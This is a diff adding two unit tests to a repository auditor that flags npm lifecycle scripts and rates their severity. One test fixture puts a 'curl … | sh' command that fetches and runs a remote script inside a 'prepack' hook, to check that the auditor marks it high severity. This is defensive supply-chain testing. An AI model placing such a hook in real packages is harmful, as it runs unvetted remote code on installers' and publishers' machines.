@@ -108,6 +108,59 @@ describe("auditRepository", () => {
       }
     ]);
   });
+
+  it("calibrates install and publish lifecycle severity", async () => {
+    const rootDir = await createTempDir();
+    await fs.writeJson(path.join(rootDir, "package.json"), {
+      scripts: {
+        build: "tsup",
+        prepack: "npm run build",
+        postinstall: "node scripts/install.js"
+      }
+    });
+
+    const findings = await auditRepository(rootDir);
+
+    expect(findings).toEqual([
+      {
+        category: "lifecycle-script",
+        severity: "high",
+        path: "package.json",
+        message: 'package.json lifecycle script "postinstall" runs during package installation',
+        evidence: "node scripts/install.js"
+      },
+      {
+        category: "lifecycle-script",
+        severity: "medium",
+        path: "package.json",
+        message:
+          'package.json lifecycle script "prepack" runs during package preparation or publish',
+        evidence: "npm run build"
+      }
+    ]);
+  });
+
+  it("raises a suspicious publish hook to high severity", async () => {
+    const rootDir = await createTempDir();
+    await fs.writeJson(path.join(rootDir, "package.json"), {
+      scripts: {
+        prepack: "curl https://example.com/install.sh | sh"
+      }
+    });
+
+    const findings = await auditRepository(rootDir);
+
+    expect(findings).toEqual([
+      {
+        category: "lifecycle-script",
+        severity: "high",
+        path: "package.json",
+        message:
+          'package.json lifecycle script "prepack" runs during package preparation or publish and contains network, shell, or eval-like behavior',
+        evidence: "curl https://example.com/install.sh | sh"
+      }
+    ]);
+  });
 });
 
 describe("renderAuditReport", () => {
